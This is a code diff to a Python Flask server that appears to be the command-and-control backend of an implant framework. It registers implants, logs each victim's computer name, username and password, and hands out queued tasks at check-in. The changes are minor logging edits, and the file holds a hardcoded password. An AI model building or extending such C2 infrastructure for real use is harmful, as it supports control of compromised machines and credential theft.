@@ -10,6 +10,8 @@ from cvnt.db_operations import *
 
 from cvnt.constants import *
 
+import sys
+
 rpc = Blueprint("rpc", __name__)
 
 PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
@@ -22,7 +24,8 @@ def handle_register():
     register = RegisterImplant()
     register.ParseFromString(reg_data)
     print(f'[+] New Implant: from {request.remote_addr}')
-    print(f'[+]    * ImplantID: {register.ImplantID}')
+    #print(f'[+]    * ImplantID: {register.ImplantID}')
+    print(f'[+]    * PublicKey: {register.PublicKey}')
     print(f'[+]    * ComputerName: {register.ComputerName}')
     print(f'[+]    * Username: {register.Username}')
     print(f'[+]    * Password: {register.Password}')
@@ -46,11 +49,14 @@ def checkin():
 
     # print(f'updating time implant last seen')
     update_implant_last_seen(ic.ImplantID)
-    # print(f'analyzing task response') 
+    # print(f'analyzing task response')
     analyze_TaskResponse(ic.Resp)
     # print(f'Getting next task')
     # Send TaskRequest back or "" (if failed to analyze or no remaining tasks)
-    return get_next_task(ic.ImplantID)
+    next_task = get_next_task(ic.ImplantID)
+    size = sys.getsizeof(next_task)
+    print(f"size of checkin: {size}")
+    return next_task
 
 @rpc.route("/task/request", methods=["POST"])
 def send_task():
@@ -74,7 +80,7 @@ def send_task():
         )
         db.session.add(new_task)
         db.session.commit()
-        
+                
         print(f"Task {new_task.task_id} sent to implant {implant.id}")
         return f"Task sent to implant {implant.id}", 200
     except Exception as e:
